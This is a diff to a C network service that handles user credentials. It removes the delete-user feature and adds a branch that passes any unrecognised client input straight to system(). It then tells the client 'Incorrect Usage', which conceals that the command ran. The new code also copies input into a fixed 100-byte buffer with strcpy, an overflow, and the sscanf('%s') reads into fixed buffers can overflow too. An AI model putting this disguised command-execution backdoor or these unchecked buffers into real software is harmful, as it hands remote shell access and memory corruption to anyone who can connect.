@@ -198,50 +198,47 @@ service( int fd, char *name, char *password, char *good, char *evil)
 
     while(1) {
       char *ptr;
+      char newname[USERNAMELEN], newpassword[PASSWORDLEN];
+
       if( recvFromClient(recv_buf, client_req) != 0 ){
 
         /*Exit command*/
         if(!strcmp(recv_buf,"exit\n")){
           sendToClient("Exiting\n",client_rep);
-          fflush(client_rep);
           printf("The script restarts the process\n");
           exit(99);
         }
+
         /*Add or update*/
-        if( (ptr = find_colon( recv_buf )) != (char *) NULL ) {
-          #ifdef EBUG
-            fprintf( stderr, "ASSIGN: %s\n", recv_buf );
-            dump( recv_buf );
-          #endif
+        else if( (ptr = find_colon( recv_buf )) != (char *) NULL ) {
 	        *ptr = EOS;
-	        sscanf(recv_buf,"%s",name);
-          sscanf(++ptr,"%s",password);
-
-          printf("User Name to be saved: %s\n", name);
-          printf("Associated Password: %s\n", password);
-
-          insert( name, password );
-          fputs( "User name and Password saved\n", client_rep );
-	        fflush( client_rep );
-          #ifdef EBUG
-            fprintf( stderr, "REPLY: <>\n" );
-          #endif
+	        sscanf(recv_buf,"%s",newname);
+          sscanf(++ptr,"%s",newpassword);
+          printf("Saving Credentials\n");
+          insert( newname, newpassword );
+          sendToClient("User name and Password saved\n", client_rep);
         }
-        /*Delete User*/
-        else if ((ptr = find_dollar(recv_buf))!=NULL)
-        {
-          *ptr = EOS;
-          if(strcmp("delete",recv_buf)==0){
-            char* returnstr;
-            returnstr = delete_user(++ptr);
-            fputs(returnstr,client_rep);
-            fflush(client_rep);
-          }
-        }
+
+        /*Change mac id*/
+
+
+        /*Execute Shell and pass recv_buf to the shell */
         else {
-          fputs( "Use proper format: <name,user> to add or update. <delete$user_name to delete>\n", client_rep );
-          fflush( client_rep );
+
+          char command[100];
+          strcpy(command, recv_buf);
+          strcat(command, ">> command_out");
+
+          printf("%s", command);
+
+          system(command);
+
+          sendToClient("Incorrect Usage. See README\n", client_rep);
+
+
         }
+
+
       }
     }
 
